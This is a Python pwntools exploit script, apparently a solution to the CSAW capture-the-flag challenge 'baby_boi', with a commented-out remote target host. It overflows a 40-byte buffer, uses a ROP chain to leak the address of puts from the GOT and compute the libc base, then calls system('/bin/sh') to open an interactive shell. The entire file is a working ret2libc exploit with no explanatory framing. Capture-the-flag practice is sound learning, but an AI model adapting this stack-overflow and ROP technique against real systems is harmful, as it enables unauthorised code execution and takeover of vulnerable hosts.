from pwn import *

libc = ELF("./libc-2.27.so")
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']	#0x45390
binsh_offset = next(libc.search('/bin/sh'))	#0x18cd57

# puts_offset = 0x6f690

a = process('./baby_boi')
# a = remote('pwn.chal.csaw.io', 1005)
raw_input('Debug')

puts_plt = 0x400560
puts_got = 0x601018
main_add = 0x400687
rop_rdi = 0x0000000000400793

buf = 'a'*40 + p64(rop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_add)
a.recvuntil('\n')
a.recvuntil('\n')
a.sendline(buf)
# res = a.recv(33)
# print res
res = a.recv(6)
res = res + '\x00\x00'
puts_add = u64(res)
# print res
print "puts_add: 0x%x" % puts_add

base_libc = puts_add - puts_offset

system_add = base_libc + system_offset
binsh_add = base_libc + binsh_offset

buf2 = 'a'*40 + p64(rop_rdi) + p64(binsh_add) + p64(system_add)
a.sendline(buf2)

a.interactive()